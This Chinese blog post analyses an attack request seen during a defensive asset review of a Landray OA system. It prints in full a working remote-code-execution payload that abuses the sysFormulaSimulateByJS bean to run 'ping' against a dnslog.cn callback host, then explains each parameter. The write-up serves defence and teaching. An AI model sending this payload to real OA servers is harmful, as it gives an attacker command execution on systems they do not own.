---
title: 恶意代码分析---蓝凌OA
date: 2023-04-15 13:13:56
author: ReadPond
tags: 
- 恶意代码
- 蓝凌OA
categories:
- 恶意代码分析
top: ture
index_img: /img/202301241049221.png
banner_img: /img/202301241049221.png
---

### 蓝凌OA—恶意代码分析

#### 一、大致经过

-   进行护网前期资产排查的时候，在客户这边的登录系统上面发现蓝凌OA的一个漏洞，同时分析攻击数据包发现恶意代码`/data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){return java.lang.Runtime};r=test();r.getRuntime().exec("ping -c 4 uftj1t.dnslog.cn")&type=1`在路径后面拼上如上代码，在DNSlog平台上面即可查看受害服务器信息。

#### 二、代码分析

-   `s_bean=sysFormulaSimulateByJS`是一个参数，它的作用是用于指定服务端要执行的一段 Java 代码。具体来说，`sysFormulaSimulateByJS`是一个 Java 类，它的作用是解析传入的 JavaScript 代码并执行它。因此，`s_bean=sysFormulaSimulateByJS` 的含义是要将传入的 JavaScript 代码解析并执行，并将执行结果返回给客户端。通过这种方式，攻击者可以利用服务端漏洞，将恶意的 JavaScript 代码传递给服务端，从而实现对服务端的攻击。在这段代码中，传递给服务端的 JavaScript 代码是一个简单的函数调用，它的目的是获取 `Java Runtime` 对象并执行一个命令。
-   `r=test()` 的作用是调用 `test` 函数并将其返回值赋值给变量 `r`。在 `test` 函数中，执行了一个简单的 JavaScript 代码，它的作用是返回 `Java Runtime` 对象。`Java Runtime`是一个表示 Java 应用程序运行时环境的对象，它提供了很多有用的方法和属性，例如可以通过 `Runtime.getRuntime().exec` 方法执行本地操作系统的命令。因此，通过获取 `Java Runtime` 对象，攻击者可以执行本地操作系统的命令，从而实现对服务端的攻击。
    -   `r=test()` 的目的是获取 `Java Runtime` 对象，这是为了后续执行命令的操作做准备。由于获取 `Java Runtime` 对象需要在 Java 环境中进行，因此需要先在服务端执行一段 Java 代码来获取它。通过这种方式，攻击者可以利用服务端漏洞，获取 `Java Runtime` 对象并执行命令，从而实现对服务端的远程命令执行和控制。
-   `type=1` 是一个参数，它的作用是用于指定返回给客户端的数据类型。具体来说，`type=1` 表示返回的数据类型是字符串类型。在此之前，服务端已经执行了传入的 JavaScript 代码，并获取了 `Java Runtime` 对象并执行了命令。通过指定 `type=1`，服务端将命令的执行结果以字符串的形式返回给客户端。
-   "`ping -c 4 uftj1t.dnslog.cn`"是一个命令行命令，它的作用是向指定的域名`（uftj1t.dnslog.cn）`发送四个 ICMP 回显请求（也称为 ping），并显示每个请求的往返时间和状态。通常情况下，这个命令是用来测试计算机之间网络连接状态。
